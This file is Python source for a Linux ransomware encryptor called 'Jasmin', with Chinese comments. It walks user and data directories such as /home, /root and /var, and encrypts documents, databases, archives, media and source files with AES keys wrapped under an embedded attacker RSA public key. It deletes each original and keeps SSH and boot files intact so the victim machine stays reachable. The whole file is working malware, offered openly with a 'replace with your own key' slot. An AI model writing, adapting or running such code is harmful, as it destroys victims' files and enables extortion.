#!/usr/bin/env python3
"""
Jasmin Linux Encryptor — AES-256-CBC + RSA-2048 混合加密
保护SSH/系统文件不被加密，确保加密后系统可正常启动和SSH登录
"""
import os, sys, struct, hashlib
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend

# ===== RSA公钥 (替换为你自己的) =====
RSA_PUBLIC_PEM = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0Z3VS5JJcds3xfn/ygWe
hEhQLiP5RO2s5RCQTBKV9n0RUVMxNBMH8VEJnAEI8hnQpKr2LMV1TsXGBQX0FWv
rVENBEYBqxE+a3DxVFpU8PQKA08W7HFv9p9b2vB9GrNLFkKN+CqXLzR7E7oLP8v8
b7cHYrLKWD2IexLhkbR0FYFk2TZ4YOCYnvOSE91rPGJbQoTz+G6Acv1sGHHCvOGe
IMPKjb8GRQHY0PrXuYt/0svbzN7g9r5yp+JBiDHjPn0mJMqZrs5ag1yrA+3e54G+
WlE0AUsm6LcCPXGGY5EPnbjyY+oB5YOFh6xMZgbOGG+iH4VEEjm2aRaYFnSlJDuM
3wIDAQAB
-----END PUBLIC KEY-----"""

# ===== 排除规则 =====
SKIP_DIRS = frozenset([
    '/boot','/dev','/proc','/sys','/run',
    '/sbin','/bin','/lib','/lib64','/usr',
    '/etc','/snap','/lost+found','/mnt',
])
SKIP_NAMES = frozenset([
    '.bashrc','.bash_profile','.profile',
    'authorized_keys','known_hosts',
    'id_rsa','id_rsa.pub','id_ed25519','id_ed25519.pub',
    'sshd_config','ssh_config',
    'shadow','passwd','group','fstab',
    'grub.cfg','initrd','vmlinuz',
])
TARGET_EXTS = {
    '.pptx','.docx','.xlsx','.txt','.pdf','.csv',
    '.jpeg','.jpg','.png','.ppt','.doc','.xls',
    '.zip','.rar','.7z','.mp3','.mp4','.avi',
    '.mov','.mkv','.sql','.bak','.mdb','.accdb',
    '.html','.php','.java','.py','.c','.cpp','.cs',
    '.json','.xml','.yaml','.yml','.md','.conf',
}

def should_skip(filepath: str) -> bool:
    fp = os.path.abspath(filepath)
    name = os.path.basename(fp)
    if fp.endswith('.jasmin'):
        return True
    for d in SKIP_DIRS:
        if fp.startswith(d + '/') or fp == d:
            return True
    if '/.ssh/' in fp or fp.endswith('/.ssh'):
        return True
    if name in SKIP_NAMES:
        return True
    _, ext = os.path.splitext(fp)
    if ext.lower() not in TARGET_EXTS:
        return True
    return False

# ===== 加密 =====
def pad16(data: bytes) -> bytes:
    n = 16 - (len(data) % 16)
    return data + bytes([n] * n)

def encrypt_file(path: str, rsa_pub_key) -> bool:
    try:
        if should_skip(path):
            return False
        plain = open(path, 'rb').read()
        if len(plain) == 0:
            return False

        sha = hashlib.sha256(plain).digest()
        aes_key = os.urandom(32)
        aes_iv = os.urandom(16)

        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(aes_iv), default_backend())
        enc = cipher.encryptor()
        ct = enc.update(pad16(plain)) + enc.finalize()

        km = aes_key + aes_iv
        ek = rsa_pub_key.encrypt(km, asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(), label=None))

        out = path + '.jasmin'
        with open(out, 'wb') as f:
            f.write(sha)
            f.write(ct)
            f.write(ek)
            f.write(struct.pack('<I', len(ek)))

        os.remove(path)
        return True
    except Exception:
        return False

def main():
    pub_key = serialization.load_pem_public_key(RSA_PUBLIC_PEM, default_backend())
    roots = ['/home', '/root', '/var', '/opt', '/tmp', '/srv']
    count = 0
    for r in roots:
        if not os.path.isdir(r):
            continue
        for dirpath, _, files in os.walk(r):
            for fname in files:
                fp = os.path.join(dirpath, fname)
                if encrypt_file(fp, pub_key):
                    count += 1
    print(f'[+] Encrypted {count} files')

if __name__ == '__main__':
    main()
